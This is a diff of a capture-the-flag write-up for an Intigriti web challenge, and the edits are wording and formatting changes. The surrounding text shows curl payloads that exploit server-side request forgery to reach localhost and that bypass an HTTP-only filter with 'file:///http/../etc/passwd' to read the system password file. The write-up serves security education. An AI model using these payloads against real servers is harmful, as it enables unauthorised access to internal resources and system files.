@@ -69,7 +69,7 @@ $ curl 'https://challenge-1025.intigriti.io/challenge.php?url=http://0.0.0.0/'
 $ curl 'https://challenge-1025.intigriti.io/challenge.php?url=http://127%252E0%252E0%252E1/'
 ```
 
-And indeed, `challenge.php` is accessed locally:
+And indeed, `challenge.php` is fetched and served locally:
 
 ![ssrf](./imgs/image-4.png)
 
@@ -82,11 +82,11 @@ A straightforward test is:
 $ curl 'https://challenge-1025.intigriti.io/challenge.php?url=file:///etc/passwd'
 ```
 
-In this instance the request failed, indicating the fetcher expects HTTP(S) input:
+In this instance the request failed, indicating the fetcher expects **HTTP(S)** input:
 
 ![lfi_failing](./imgs/image-5.png)
 
-If the server’s filter just performs a naive substring match, without validating that the supplied URL is a properly formatted HTTP(S) one, it is possible to embed `http` as a harmless path segment plus `..` traversal so that the URL normalizes to `/etc/passwd` bypassing the literal string check:
+If the server’s filter just performs a naive substring match, without validating that the supplied URL is a properly formatted **HTTP(S)** one, it is possible to embed `http` as a harmless path segment plus `..` traversal so that the URL normalizes to `/etc/passwd` bypassing the literal string check:
 
 ```bash
 $ curl 'https://challenge-1025.intigriti.io/challenge.php?url=file:///http/../etc/passwd'
